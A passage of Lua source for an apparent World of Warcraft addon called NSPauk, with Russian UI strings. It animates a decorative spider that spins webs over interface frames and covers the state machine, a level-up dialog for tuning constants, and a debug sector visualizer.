        S.monitorTimer = S.monitorTimer + dt

        if S.monitorTimer >= C.MONITOR_CHECK then
            S.monitorTimer = 0

            self:CheckInstancesMovement()
        end
    end

    if S.phase == "task"
        or S.phase == "instanceComplete"
        or S.phase == "dissolve"
        or S.phase == "limitWait"
        or S.phase == "mothEat" then
        self:CheckMouseThreads(dt)
    end

    if S.phase == "watch" then
        self:CheckMothHunt(dt)

        if S.moth and S.moth.active then
            return
        end

        S.speedTimer = S.speedTimer + dt

        if S.speedTimer >= C.SPEED_CHECK then
            S.speedTimer = 0

            if self:IsMoving() then
                S.stillTimer = 0
            else
                S.stillTimer = S.stillTimer + C.SPEED_CHECK

                if S.stillTimer >= C.STILL_WAIT then
                    self:StartNewInstance(nil)
                end
            end
        end

        return
    end

    if S.phase == "task" then
        S.speedTimer = S.speedTimer + dt

        if S.speedTimer >= C.SPEED_CHECK then
            S.speedTimer = 0

            if self:IsMoving() then
                self:Interrupt()

                return
            end
        end

        self:CheckMothHunt(dt)

        if S.phase ~= "task" then
            return
        end

        local task = S.currentTask

        if not task or not self:IsTaskValid(task) then
            self:AdvanceTask()

            return
        end

        if not S.moveDur or S.moveDur <= 0 then
            S.moveDur = 0.08
        end

        S.moveT = S.moveT + (dt / S.moveDur)

        if S.moveT > 1 then
            S.moveT = 1
        end

        local x, y = self:BzThread(task, S.moveT)

        self:PutSpider(x, y)

        if task.kind == "thread" and task.drop then
            self:DropAlongCurve(task, S.lastTaskT or 0, S.moveT)

            S.lastTaskT = S.moveT

            if self:CheckPointLimit() then
                return
            end
        else
            S.lastTaskT = S.moveT
        end

        if S.moveT >= 1 then
            self:AdvanceTask()
        end

        return
    end

    if S.phase == "instanceComplete" then
        S.speedTimer = S.speedTimer + dt

        if S.speedTimer >= C.SPEED_CHECK then
            S.speedTimer = 0

            if self:IsMoving() then
                self:Interrupt()

                return
            end
        end

        if S.currentInstance and S.currentInstance.isMoth then
            if S.moth and S.moth.active then
                self:BeginMothEat()

                return
            end

            self:TearInstance(S.currentInstance)

            S.currentInstance = nil
            S.phase = "watch"
            S.stillTimer = 0
            S.speedTimer = 0

            return
        end

        if self:CheckPointLimit() then
            return
        end

        self:CheckMothHunt(dt)

        if S.phase ~= "instanceComplete" then
            return
        end

        S.completeTimer = S.completeTimer + dt

        if S.completeTimer >= C.COMPLETE_PAUSE then
            if S.currentInstance and S.currentInstance.isCocoon then
                self:BeginDissolve(S.currentInstance)
            else
                local nextHub = self:ChooseNextHub(S.currentInstance)

                self:StartNewInstance(nextHub)
            end
        end

        return
    end

    if S.phase == "dissolve" then
        S.speedTimer = S.speedTimer + dt

        if S.speedTimer >= C.SPEED_CHECK then
            S.speedTimer = 0

            if self:IsMoving() then
                self:Interrupt()

                return
            end
        end

        local c = S.cocoon

        if not c then
            if S.limitReached or S.limitCocoonPending then
                self:ReturnToLimitHome()
            else
                S.phase = "watch"
                S.stillTimer = 0
                S.speedTimer = 0
            end

            return
        end

        if not self:InstanceHasAliveConn(c.inst) then
            self:AbortCocoon()

            if S.phase ~= "limitWait" and not S.limitReturnPending then
                if S.limitReached then
                    self:ReturnToLimitHome()
                else
                    S.phase = "watch"
                    S.stillTimer = 0
                    S.speedTimer = 0
                end
            end

            return
        end

        c.timer = c.timer + dt

        local progress = c.timer / c.duration

        if progress > 1 then
            progress = 1
        end

        local alpha = c.baseAlpha * (1 - progress)
        local minAlpha = c.minAlpha or C.MIN_COCOON_ALPHA

        if alpha < minAlpha then
            alpha = minAlpha
        end

        if c.frame and c.frame.SetAlpha then
            c.frame:SetAlpha(alpha)
        end

        if c.inst then
            self:SetInstanceWebAlpha(c.inst, C.WEB_ALPHA * (1 - progress))
        end

        if progress >= 1 then
            self:FinishCocoonDigestion()
        end

        return
    end

    if S.phase == "limitWait" then
        S.speedTimer = S.speedTimer + dt

        if S.speedTimer >= C.SPEED_CHECK then
            S.speedTimer = 0

            if self:IsMoving() then
                self:Interrupt()

                return
            end
        end

        if not S.spider or not S.spider:IsShown() then
            self:MkSpider()
            self:MkClickBtn()

            if S.limitHomePoint and S.limitHomePoint.x and S.limitHomePoint.y then
                self:PutSpider(S.limitHomePoint.x, S.limitHomePoint.y)
            end
        end

        S.limitWaitTimer = (S.limitWaitTimer or 0) + dt

        local interval = tonumber(C.LIMIT_COCOON_INTERVAL) or 1800

        if S.limitWaitTimer >= interval then
            S.limitWaitTimer = 0

            self:StartLimitCocoon()
        end

        return
    end

    if S.phase == "mothEat" then
        self:UpdateMothEat(dt)

        return
    end

    if S.phase == "fade" then
        S.speedTimer = S.speedTimer + dt

        if S.speedTimer >= C.SPEED_CHECK then
            S.speedTimer = 0

            if self:IsMoving() then
                self:ClearAllVisuals()

                S.phase = "disabled"
                S.disableTimer = 0

                return
            end
        end

        self:UpdateFades(dt)

        return
    end

    if S.phase == "disabled" then
        S.disableTimer = S.disableTimer + dt

        if S.disableTimer >= C.DISABLE_TIME then
            S.phase = "watch"
            S.stillTimer = 0
            S.speedTimer = 0
            S.disableTimer = 0
        end

        return
    end
end

function NSPauk:FormatConstantValue(key, value)
    if key == "SURVIVAL_CHANCE" then
        if type(value) ~= "number" or value ~= value then
            return "0%"
        end

        return string.format("%.1f%%", value * 100)
    end

    if type(value) ~= "number" then
        return tostring(value)
    end

    if math.floor(value) == value then
        return tostring(math.floor(value))
    end

    return string.format("%.3f", value)
end

function NSPauk:FormatConstantDelta(key, delta)
    if type(delta) ~= "number" or delta ~= delta then
        return "?"
    end

    if math.abs(delta) < 1e-9 then
        return "без изменений"
    end

    local sign = delta > 0 and "+" or "-"
    local abs = math.abs(delta)

    if key == "SURVIVAL_CHANCE" then
        return string.format("%s%.1f п.п.", sign, abs * 100)
    end

    if math.floor(abs) == abs then
        return string.format("%s%d", sign, math.floor(abs))
    end

    if abs >= 100 then
        return string.format("%s%.1f", sign, abs)
    end

    return string.format("%s%.3f", sign, abs)
end

function NSPauk:ClampConstant(key, old, new)
    if type(new) ~= "number" or new ~= new then
        return old
    end

    local def = self.DefaultConstants[key]

    if type(def) ~= "number" then
        return new
    end

    if def > 0 and new <= 0 then
        new = def * 0.01

        if new <= 0 then
            new = 0.0001
        end
    end

    if key:find("ALPHA", 1, true)
        or key:find("CHANCE", 1, true)
        or key:find("PERCENT", 1, true) then
        if new < 0 then
            new = 0
        end

        if new > 1 then
            new = 1
        end
    end

    if key == "TARGET_COUNT_MIN"
        and type(self.C.TARGET_COUNT_MAX) == "number"
        and new > self.C.TARGET_COUNT_MAX then
        new = self.C.TARGET_COUNT_MAX
    elseif key == "TARGET_COUNT_MAX"
        and type(self.C.TARGET_COUNT_MIN) == "number"
        and new < self.C.TARGET_COUNT_MIN then
        new = self.C.TARGET_COUNT_MIN
    end

    if key == "SPIDER_SPEED_MIN"
        and type(self.C.SPIDER_SPEED_MAX) == "number"
        and new > self.C.SPIDER_SPEED_MAX then
        new = self.C.SPIDER_SPEED_MAX
    elseif key == "SPIDER_SPEED_MAX"
        and type(self.C.SPIDER_SPEED_MIN) == "number"
        and new < self.C.SPIDER_SPEED_MIN then
        new = self.C.SPIDER_SPEED_MIN
    end

    if key == "POINTS_PER_LEVEL" and new < 1 then
        new = 1
    end

    if key == "SESSION_FULL_POINTS" and new < 1 then
        new = 1
    end

    if key == "LIMIT_COCOON_INTERVAL" and new < 1 then
        new = 1
    end

    if key == "LIMIT_COCOON_RETRY" and new < 1 then
        new = 1
    end

    if key == "MOTH_POUNCE_DIST" and new < 50 then
        new = 50
    end

    return new
end

function NSPauk:AdjustConstant(key, direction)
    local db = self:EnsureDB()
    local C = self.C

    local old = C[key]

    if type(old) ~= "number" or old ~= old then
        return
    end

    local new

    if key == "SURVIVAL_CHANCE" then
        local step = self:RandomFloat(0.01, 0.05)

        if direction > 0 then
            new = old + step
        else
            new = old - step
        end
    else
        local pct = self:RandomFloat(0.001, 0.05)
        local base = math.abs(old)

        if base == 0 then
            base = 1
        end

        local delta = base * pct

        if delta == 0 then
            delta = 0.001
        end

        if direction > 0 then
            new = old + delta
        else
            new = old - delta
        end
    end

    new = self:ClampConstant(key, old, new)

    C[key] = new

    if db.constants then
        db.constants[key] = new
    end

    self:ApplyRuntimeConstants()

    if type(db.progress) ~= "table" then
        db.progress = { totalPoints = 0 }
    end

    if type(db.progress.history) ~= "table" then
        db.progress.history = {}
    end

    local delta = new - old

    db.progress.history[#db.progress.history + 1] = {
        key = key,
        old = old,
        new = new,
        delta = delta,
        direction = direction > 0 and 1 or -1,
        level = self:GetSpiderLevel(),
        at = type(time) == "function" and time() or 0,
    }

    local label = key

    if type(self.ConstantDescriptions) == "table"
        and type(self.ConstantDescriptions[key]) == "string"
        and self.ConstantDescriptions[key] ~= "" then
        label = self.ConstantDescriptions[key]
    end

    local choice = direction > 0 and "плюс" or "минус"

    self:SendOfficer(string.format(
        "Павук: выбрано «%s» (%s): %s -> %s (%s)",
        label,
        choice,
        self:FormatConstantValue(key, old),
        self:FormatConstantValue(key, new),
        self:FormatConstantDelta(key, delta)
    ))
end

function NSPauk:HideLevelUpFrame()
    if self.levelUpFrame then
        self.levelUpFrame:Hide()
    end
end

function NSPauk:ShowLevelUpFrame()
    self:CreateLevelUpFrame()

    if not self.levelUpFrame then
        return
    end

    for _, row in ipairs(self.levelUpRows or {}) do
        if row.value then
            row.value:SetText(self:FormatConstantValue(row.key, self.C[row.key]))
        end
    end

    if self.levelUpScroll then
        self.levelUpScroll:SetVerticalScroll(0)
    end

    self.levelUpFrame:Show()
end

function NSPauk:CreateLevelUpFrame()
    if self.levelUpFrame then
        return
    end

    local f = CreateFrame("Frame", "NSPauk_LevelUpFrame", UIParent)
    f:SetWidth(560)
    f:SetHeight(420)
    f:SetPoint("CENTER")
    f:SetFrameStrata("DIALOG")
    f:SetFrameLevel(120)
    f:EnableMouse(true)
    f:SetMovable(true)
    f:SetClampedToScreen(true)
    f:RegisterForDrag("LeftButton")

    f:SetScript("OnDragStart", function(frame)
        frame:StartMoving()
    end)

    f:SetScript("OnDragStop", function(frame)
        frame:StopMovingOrSizing()
    end)

    f:Hide()

    if type(UISpecialFrames) == "table" and f:GetName() then
        table.insert(UISpecialFrames, f:GetName())
    end

    local function setColor(tex, r, g, b, a)
        if not tex then
            return
        end

        if tex.SetColorTexture then
            tex:SetColorTexture(r, g, b, a or 1)
        else
            tex:SetTexture(1, 1, 1, 1)
            tex:SetVertexColor(r, g, b, a or 1)
        end
    end

    local bg = f:CreateTexture(nil, "BACKGROUND")
    bg:SetAllPoints(f)
    setColor(bg, 0.06, 0.06, 0.10, 0.94)

    local title = f:CreateFontString(nil, "OVERLAY", "GameFontHighlightLarge")
    title:SetPoint("TOP", 0, -12)
    title:SetText("Павук: новый уровень!")

    local closeBtn = CreateFrame("Button", nil, f)
    closeBtn:SetWidth(24)
    closeBtn:SetHeight(24)
    closeBtn:SetPoint("TOPRIGHT", -8, -8)
    closeBtn:EnableMouse(true)

    local closeBg = closeBtn:CreateTexture(nil, "BACKGROUND")
    closeBg:SetAllPoints(closeBtn)
    setColor(closeBg, 0.35, 0.10, 0.10, 1)

    local closeText = closeBtn:CreateFontString(nil, "OVERLAY", "GameFontHighlight")
    closeText:SetPoint("CENTER")
    closeText:SetText("X")

    closeBtn:SetScript("OnClick", function()
        self:HideLevelUpFrame()
    end)

    closeBtn:SetScript("OnEnter", function()
        setColor(closeBg, 0.50, 0.16, 0.16, 1)
    end)

    closeBtn:SetScript("OnLeave", function()
        setColor(closeBg, 0.35, 0.10, 0.10, 1)
    end)

    local scroll = CreateFrame("ScrollFrame", nil, f)
    scroll:SetPoint("TOPLEFT", 14, -42)
    scroll:SetPoint("BOTTOMRIGHT", -18, 14)

    local child = CreateFrame("Frame", nil, scroll)
    child:SetWidth(510)

    scroll:SetScrollChild(child)
    scroll:EnableMouseWheel(true)

    scroll:SetScript("OnMouseWheel", function(frame, delta)
        local current = frame:GetVerticalScroll()
        local maxScroll = frame:GetVerticalScrollRange()

        local newScroll = current - (delta * 20)

        if newScroll < 0 then
            newScroll = 0
        end

        if newScroll > maxScroll then
            newScroll = maxScroll
        end

        frame:SetVerticalScroll(newScroll)
    end)

    self.levelUpFrame = f
    self.levelUpScroll = scroll
    self.levelUpChild = child
    self.levelUpRows = {}

    local orderedKeys = {
        -- Внешний вид
        "SPIDER_SIZE",
        "WEB_SIZE",
        "WEB_ALPHA",
        "WEB_POINT_SPACING_MAX",
        "MAIN_SAG_MIN",
        "MAIN_SAG_MAX",
        "CROSS_SAG_MIN",
        "CROSS_SAG_MAX",

        -- Паутина
        "TARGET_COUNT_MIN",
        "TARGET_COUNT_MAX",
        "MAX_INSTANCES",
        "CROSS_ROW_SPACING",
        "WEB_THREAD_MIN_SEPARATION",
        "MIN_WEB_GAP",
        "MIN_CROSS_LEN",
        "MAX_CROSS_ROWS",

        -- Скорость
        "SPIDER_SPEED_MIN",
        "SPIDER_SPEED_MAX",
        "FAST_MODE",
        "TRAVEL_SPEED_MULT",
        "CROSS_SPEED_MULT",
        "MAIN_SPEED_MULT",
        "EMPTY_SPEED_MULT",
        "MOTH_POUNCE_DIST",

        -- Кокон
        "COCOON_CHANCE",
        "DISSOLVE_DURATION_MIN",
        "DISSOLVE_DURATION_MAX",
        "COCOON_MIN_WIDTH",
        "COCOON_MIN_AREA",
        "COCOON_MAX_AREA",

        -- Прогресс и выживаемость
        "POINTS_PER_LEVEL",
        "COCOON_EXP_PERCENT",
        "SESSION_FULL_POINTS",
        "SESSION_EXP_PERCENT_MAX",
        "SURVIVAL_CHANCE",
    }

    local keys = {}

    for _, key in ipairs(orderedKeys) do
        if self.DefaultConstants[key] ~= nil
            and type(self.ConstantDescriptions) == "table"
            and type(self.ConstantDescriptions[key]) == "string"
            and self.ConstantDescriptions[key] ~= "" then
            keys[#keys + 1] = key
        end
    end

    local rowHeight = 22

    for i, key in ipairs(keys) do
        local row = CreateFrame("Frame", nil, child)
        row:SetHeight(rowHeight)
        row:SetPoint("TOPLEFT", child, "TOPLEFT", 0, -((i - 1) * rowHeight))
        row:SetPoint("RIGHT", child, "RIGHT", 0, 0)

        local nameText = row:CreateFontString(nil, "OVERLAY", "GameFontHighlightSmall")
        nameText:SetPoint("LEFT", 0, 0)
        nameText:SetJustifyH("LEFT")
        nameText:SetWidth(330)

        local desc = self.ConstantDescriptions and self.ConstantDescriptions[key]
        nameText:SetText(desc or key)

        local minus = CreateFrame("Button", nil, row)
        minus:SetWidth(22)
        minus:SetHeight(22)
        minus:SetPoint("RIGHT", row, "RIGHT", 0, 0)
        minus:EnableMouse(true)

        local minusBg = minus:CreateTexture(nil, "BACKGROUND")
        minusBg:SetAllPoints(minus)
        setColor(minusBg, 0.22, 0.22, 0.28, 1)

        local minusText = minus:CreateFontString(nil, "OVERLAY", "GameFontHighlight")
        minusText:SetPoint("CENTER")
        minusText:SetText("-")

        minus:SetScript("OnEnter", function()
            setColor(minusBg, 0.32, 0.32, 0.40, 1)
        end)

        minus:SetScript("OnLeave", function()
            setColor(minusBg, 0.22, 0.22, 0.28, 1)
        end)

        local plus = CreateFrame("Button", nil, row)
        plus:SetWidth(22)
        plus:SetHeight(22)
        plus:SetPoint("RIGHT", minus, "LEFT", -4, 0)
        plus:EnableMouse(true)

        local plusBg = plus:CreateTexture(nil, "BACKGROUND")
        plusBg:SetAllPoints(plus)
        setColor(plusBg, 0.22, 0.30, 0.22, 1)

        local plusText = plus:CreateFontString(nil, "OVERLAY", "GameFontHighlight")
        plusText:SetPoint("CENTER")
        plusText:SetText("+")

        plus:SetScript("OnEnter", function()
            setColor(plusBg, 0.32, 0.44, 0.32, 1)
        end)

        plus:SetScript("OnLeave", function()
            setColor(plusBg, 0.22, 0.30, 0.22, 1)
        end)

        local valueText = row:CreateFontString(nil, "OVERLAY", "GameFontHighlightSmall")
        valueText:SetPoint("RIGHT", plus, "LEFT", -8, 0)
        valueText:SetJustifyH("RIGHT")
        valueText:SetWidth(90)

        row.key = key
        row.value = valueText

        minus:SetScript("OnClick", function()
            self:AdjustConstant(key, -1)
            self:HideLevelUpFrame()
        end)

        plus:SetScript("OnClick", function()
            self:AdjustConstant(key, 1)
            self:HideLevelUpFrame()
        end)

        self.levelUpRows[#self.levelUpRows + 1] = row
    end

    child:SetHeight(#keys * rowHeight + 10)
end

function NSPauk:OnEvent()
    self:LoadConstants()

    self.S.SW, self.S.SH = self:GetScreenSize()
end

function NSPauk:IsActiveAnchorFrame(frame)
    if not frame then
        return false
    end

    local S = self.S

    for _, inst in ipairs(S.instances) do
        if self:InstanceHasAliveConn(inst) then
            if inst.hub and inst.hub.frame == frame then
                return true
            end

            for _, conn in ipairs(inst.conns) do
                if conn.alive and conn.target and conn.target.frame == frame then
                    return true
                end
            end
        end
    end

    if S.cocoon and S.cocoon.frame == frame then
        return true
    end

    return false
end

function NSPauk:PickLimitCocoonVictim(items)
    local pool = self:CollectCocoonCandidates(items, true)

    if #pool == 0 then
        return nil
    end

    return pool[self:RandomInt(1, #pool)]
end

function NSPauk:ChooseLimitHomePoint()
    local S = self.S

    local pts = {}

    for _, inst in ipairs(S.instances) do
        if self:InstanceHasAliveConn(inst) and inst.hub then
            if inst.hub.frame then
                local cur = self:ComputeFrameVisibleInner(inst.hub.frame)

                if cur then
                    pts[#pts + 1] = { x = cur.cx, y = cur.cy }
                end
            end

            if inst.hub.rect and inst.hub.rect.cx and inst.hub.rect.cy then
                pts[#pts + 1] = { x = inst.hub.rect.cx, y = inst.hub.rect.cy }
            end
        end
    end

    if #pts > 0 then
        return pts[self:RandomInt(1, #pts)]
    end

    if S.limitHomePoint and S.limitHomePoint.x and S.limitHomePoint.y then
        return { x = S.limitHomePoint.x, y = S.limitHomePoint.y }
    end

    local sw, sh = self:GetScreenSize()

    return { x = sw / 2, y = sh / 2 }
end

function NSPauk:EnterLimitIdle()
    local S = self.S

    if S.limitReached then
        return
    end

    S.limitReached = true
    S.limitCocoonPending = false
    S.limitReturnPending = true
    S.limitWaitTimer = 0

    for _, inst in ipairs(S.instances) do
        self:SettleInstance(inst)
    end

    S.tasks = {}
    S.taskIdx = 1
    S.currentTask = nil
    S.completeTimer = 0

    local home = self:ChooseLimitHomePoint()

    S.limitHomePoint = home

    self:MkSpider()
    self:MkClickBtn()

    local from = { x = S.lastSpiderX or 0, y = S.lastSpiderY or 0 }

    local travel = {
        kind = "travel",
        drop = false,
        p0 = from,
        p1 = {
            x = (from.x + home.x) / 2,
            y = (from.y + home.y) / 2,
        },
        p2 = { x = home.x, y = home.y },
    }

    S.tasks = { travel }
    S.taskIdx = 1
    S.currentTask = nil

    self:AdvanceTask()
end

function NSPauk:CheckPointLimit()
  local S = self.S
  local C = self.C
  local t = S.currentTask

  if t and t.nspFall then
    return false
  end

  if S.phase == "task" and t and t.nspDuringDrag and not t.nspDragEnd then
    return false
  end

  if S.limitReached or S.limitReturnPending or S.limitCocoonPending then
    return false
  end

  if S.phase ~= "task" and S.phase ~= "instanceComplete" then
    return false
  end

  if S.currentInstance and S.currentInstance.isCocoon then
    return false
  end

  if S.cocoon then
    return false
  end

  local max = tonumber(C.MAX_WEB_SEGS) or 0

  if max <= 0 then
    return false
  end

  if (S.webAliveCount or 0) >= max then
    self:EnterLimitIdle()
    return true
  end

  return false
end

function NSPauk:StartLimitCocoon()
    local S = self.S
    local C = self.C

    local items = self:CollectVisibleItems()
    local victim = self:PickLimitCocoonVictim(items)

    if not victim then
        S.phase = "limitWait"

        local interval = tonumber(C.LIMIT_COCOON_INTERVAL) or 1800
        local retry = tonumber(C.LIMIT_COCOON_RETRY) or 60

        S.limitWaitTimer = math.max(0, interval - retry)

        return
    end

    S.limitCocoonPending = true

    self:StartCocoon(victim)
end

function NSPauk:ReturnToLimitHome()
    local S = self.S

    S.limitReached = true
    S.limitCocoonPending = false
    S.limitReturnPending = true
    S.limitWaitTimer = 0

    S.tasks = {}
    S.taskIdx = 1
    S.currentTask = nil
    S.completeTimer = 0

    local home = self:ChooseLimitHomePoint()

    S.limitHomePoint = home

    self:MkSpider()
    self:MkClickBtn()

    local from = { x = S.lastSpiderX or 0, y = S.lastSpiderY or 0 }

    local travel = {
        kind = "travel",
        drop = false,
        p0 = from,
        p1 = {
            x = (from.x + home.x) / 2,
            y = (from.y + home.y) / 2,
        },
        p2 = { x = home.x, y = home.y },
    }

    S.tasks = { travel }
    S.taskIdx = 1
    S.currentTask = nil

    self:AdvanceTask()
end

function NSPauk:NP_ClearSectorsDebug()
    local S = self.S
    local dbg = S.nspSectorsDebug
    if not dbg then
        return
    end

    if dbg.workerFrame then
        dbg.workerFrame:SetScript("OnUpdate", nil)
        dbg.workerFrame:Hide()
        dbg.workerFrame = nil
    end
    if dbg.textures and #dbg.textures > 0 then
        self:RecycleTextures(dbg.textures)
    end
    if dbg.fonts then
        for _, fs in ipairs(dbg.fonts) do
            if fs and fs.Hide then
                fs:Hide()
            end
        end
    end
    S.nspSectorsDebug = nil
end

function NSPauk:NP_DrawSectorsDebug()
    local S = self.S
    local inst = S.currentInstance

    self:NP_ClearSectorsDebug()

    if not inst then
        self:Echo("Нет текущей паутины для визуализации.")
        return
    end

    if inst.isCocoon or inst.isMoth then
        self:Echo("Визуализация секторов недоступна для коконов и мотыльков.")
        return
    end

    local N = inst.conns and #inst.conns or 0
    if N < 2 then
        self:Echo("Меньше 2 нитей, нечего визуализировать.")
        return
    end

    local sectorThreadCount = 0
    for _, conn in ipairs(inst.conns) do
        if conn.alive and not conn.noSector then
            sectorThreadCount = sectorThreadCount + 1
        end
    end

    if sectorThreadCount > 12 then
        self:Echo(string.format(
            "Слишком много секторных нитей (%d), визуализация отключена.",
            sectorThreadCount
        ))
        return
    end

    local dbg = {
        textures = {},
        fonts = {},
        queue = {},
        queueIdx = 1,
        workerFrame = nil,
    }

    S.nspSectorsDebug = dbg

    local frame = S.activeFrame or UIParent

    local palette = self.PreviewColors
    if type(palette) ~= "table" or #palette == 0 then
        palette = {
            { r = 1.0, g = 0.2, b = 0.2 },
            { r = 0.2, g = 1.0, b = 0.2 },
            { r = 0.2, g = 0.6, b = 1.0 },
            { r = 1.0, g = 1.0, b = 0.2 },
            { r = 1.0, g = 0.4, b = 1.0 },
            { r = 0.2, g = 1.0, b = 1.0 },
            { r = 1.0, g = 0.6, b = 0.2 },
            { r = 0.7, g = 0.7, b = 1.0 },
        }
    end

    local C = self.C

    local function label(x, y, text, color, fontSize)
        local fs = frame:CreateFontString(nil, "OVERLAY", "GameFontNormal")
        if not fs then
            return
        end

        fs:SetText(text)
        fs:SetTextColor(color.r, color.g, color.b, 1)

        if fontSize then
            local fontName = fs:GetFont()
            if fontName then
                fs:SetFont(fontName, fontSize)
            end
        end

        fs:SetPoint("CENTER", UIParent, "BOTTOMLEFT", x, y)

        dbg.fonts[#dbg.fonts + 1] = fs
    end

    local function queueDot(x, y, color, alpha, size)
        dbg.queue[#dbg.queue + 1] = {
            x = x,
            y = y,
            color = color,
            alpha = alpha or 0.9,
            size = size or 3,
        }
    end

    local function queueLine(x1, y1, x2, y2, color, alpha, step)
        step = step or 4

        local dx = x2 - x1
        local dy = y2 - y1
        local len = math.sqrt(dx * dx + dy * dy)

        if len < 1 then
            return
        end

        local n = math.max(2, math.floor(len / step) + 1)

        for i = 0, n do
            local t = i / n
            queueDot(
                x1 + dx * t,
                y1 + dy * t,
                color,
                alpha,
                step * 0.8
            )
        end
    end

    local function queueBezier(p0, p1, p2, color, alpha, step)
        if not p0 or not p2 then
            return
        end

        if not p1 then
            p1 = {
                x = (p0.x + p2.x) / 2,
                y = (p0.y + p2.y) / 2,
            }
        end

        step = step or 3

        local dx = p2.x - p0.x
        local dy = p2.y - p0.y
        local chord = math.sqrt(dx * dx + dy * dy)
        local n = math.max(2, math.floor(chord / step) + 1)

        for i = 0, n do
            local t = i / n
            local m = 1 - t

            local x = m * m * p0.x + 2 * m * t * p1.x + t * t * p2.x
            local y = m * m * p0.y + 2 * m * t * p1.y + t * t * p2.y

            queueDot(x, y, color, alpha, step * 0.9)
        end
    end

    local function queueTriangle(ax, ay, bx, by, cx, cy, color, alpha, step)
        step = step or 22

        local minX = math.min(ax, bx, cx)
        local maxX = math.max(ax, bx, cx)
        local minY = math.min(ay, by, cy)
        local maxY = math.max(ay, by, cy)

        local y = minY
        while y <= maxY do
            local x = minX
            while x <= maxX do
                if self:NP_PointInTriangle(x, y, ax, ay, bx, by, cx, cy) then
                    queueDot(x, y, color, alpha, step * 0.6)
                end
                x = x + step
            end
            y = y + step
        end
    end

    local hubX = (inst.hub.rect and inst.hub.rect.cx) or 0
    local hubY = (inst.hub.rect and inst.hub.rect.cy) or 0

    local validSectors = self:NP_GetValidTriangleSectors(inst)
    local validKeys = {}

    for _, sector in ipairs(validSectors or {}) do
        validKeys[sector.key] = true
    end

    for i = 1, N do
        for j = i + 1, N do
            local connA = inst.conns[i]
            local connB = inst.conns[j]

            if connA and connB
                and connA.alive
                and connB.alive
                and connA.thread
                and connB.thread
                and not connA.noSector
                and not connB.noSector then

                local ax, ay = self:BzThread(connA.thread, 1)
                local bx, by = self:BzThread(connB.thread, 1)

                local key = i .. "-" .. j

                if validKeys[key] then
                    local colA = palette[((i - 1) % #palette) + 1]
                    local colB = palette[((j - 1) % #palette) + 1]

                    if not colA then
                        colA = { r = 1, g = 1, b = 1 }
                    end
                    if not colB then
                        colB = { r = 1, g = 1, b = 1 }
                    end

                    local blend = {
                        r = (colA.r + colB.r) / 2,
                        g = (colA.g + colB.g) / 2,
                        b = (colA.b + colB.b) / 2,
                    }

                    queueTriangle(hubX, hubY, ax, ay, bx, by, blend, 0.10, 22)

                    queueLine(hubX, hubY, ax, ay, colA, 0.5, 5)
                    queueLine(hubX, hubY, bx, by, colB, 0.5, 5)
                    queueLine(ax, ay, bx, by, blend, 0.7, 5)

                    local cx = (hubX + ax + bx) / 3
                    local cy = (hubY + ay + by) / 3

                    local angle = 0
                    if type(self.NP_LocalAngleAtHub) == "function" then
                        local aAng = self:NP_LocalAngleAtHub(inst, connA)
                        local bAng = self:NP_LocalAngleAtHub(inst, connB)

                        local delta = bAng - aAng

                        while delta < 0 do
                            delta = delta + 2 * math.pi
                        end
                        while delta >= 2 * math.pi do
                            delta = delta - 2 * math.pi
                        end

                        if delta > math.pi then
                            delta = 2 * math.pi - delta
                        end

                        angle = delta * 180 / math.pi
                    end

                    label(
                        cx,
                        cy,
                        string.format("%s\n%.0f", key, angle),
                        blend,
                        11
                    )
                elseif not inst.isNaturalRing then
                    queueLine(ax, ay, bx, by, { r = 1, g = 0.15, b = 0.15 }, 0.9, 5)

                    local cx = (ax + bx) / 2
                    local cy = (ay + by) / 2

                    label(
                        cx,
                        cy,
                        key .. "\nЗАПРЕТ",
                        { r = 1, g = 0.15, b = 0.15 },
                        10
                    )
                end
            end
        end
    end

    for i, conn in ipairs(inst.conns) do
        local col = palette[((i - 1) % #palette) + 1]
        if not col then
            col = { r = 1, g = 1, b = 1 }
        end

        local alpha = 0.9
        if conn.noSector then
            alpha = 0.4
        end

        if conn.alive and conn.thread then
            queueBezier(
                conn.thread.p0,
                conn.thread.p1,
                conn.thread.p2,
                col,
                alpha,
                3
            )

            local ex, ey = self:BzThread(conn.thread, 1)

            local typeLabel = tostring(i)
            if conn.isDiameterHalf then
                typeLabel = i .. " H"
            elseif conn.isMidSpoke then
                typeLabel = i .. " M"
            elseif conn.isSpoke then
                typeLabel = i .. " S"
            elseif conn.isDiameter then
                typeLabel = i .. " D"
            elseif conn.isRingFrame then
                typeLabel = i .. " P"
            end

            label(ex + 12, ey + 12, typeLabel, col, 14)
        else
            if conn.thread then
                queueBezier(
                    conn.thread.p0,
                    conn.thread.p1,
                    conn.thread.p2,
                    { r = 0.4, g = 0.1, b = 0.1 },
                    0.5,
                    5
                )
            end
        end
    end

    for i = 0, 11 do
        local ang = (i / 12) * 2 * math.pi
        queueDot(
            hubX + math.cos(ang) * 8,
            hubY + math.sin(ang) * 8,
            { r = 1, g = 1, b = 1 },
            0.9,
            3
        )
    end

    label(hubX, hubY - 14, "ХАБ", { r = 1, g = 1, b = 1 }, 10)

    if #dbg.queue == 0 then
        self:Echo("Визуализация: 0 точек.")
        return
    end

    self:Echo(string.format(
        "Визуализация: %d точек в очереди, рисую пакетами...",
        #dbg.queue
    ))

    local BATCH_SIZE = 500
    local BATCH_DELAY = 0.04

    dbg.workerFrame = CreateFrame("Frame")

    dbg.workerFrame:SetScript("OnUpdate", function(selfFrame, dt)
        local currentDbg = S.nspSectorsDebug

        if not currentDbg or not currentDbg.queue then
            selfFrame:SetScript("OnUpdate", nil)
            selfFrame:Hide()
            return
        end

        currentDbg.workerElapsed = (currentDbg.workerElapsed or 0) + dt

        if currentDbg.workerElapsed < BATCH_DELAY then
            return
        end

        currentDbg.workerElapsed = 0

        local idx = currentDbg.queueIdx or 1
        local total = #currentDbg.queue
        local drawn = 0

        while idx <= total and drawn < BATCH_SIZE do
            local op = currentDbg.queue[idx]
            idx = idx + 1
            drawn = drawn + 1

            local tex

            if #S.webPool > 0 then
                tex = table.remove(S.webPool)
                if tex then
                    tex._nspInPool = false
                end
            end

            if not tex then
                tex = frame:CreateTexture(nil, "OVERLAY")
            end

            if tex then
                tex:SetTexture(C.TEX_WEB)
                tex:SetDrawLayer("OVERLAY")
                tex:SetVertexColor(op.color.r, op.color.g, op.color.b, 1)
                tex:SetAlpha(op.alpha)
                tex:SetWidth(op.size)
                tex:SetHeight(op.size)
                tex:ClearAllPoints()
                tex:SetPoint("CENTER", UIParent, "BOTTOMLEFT", op.x, op.y)
                tex:Show()

                currentDbg.textures[#currentDbg.textures + 1] = tex
            end
        end

        currentDbg.queueIdx = idx

        if idx > total then
            selfFrame:SetScript("OnUpdate", nil)
            selfFrame:Hide()

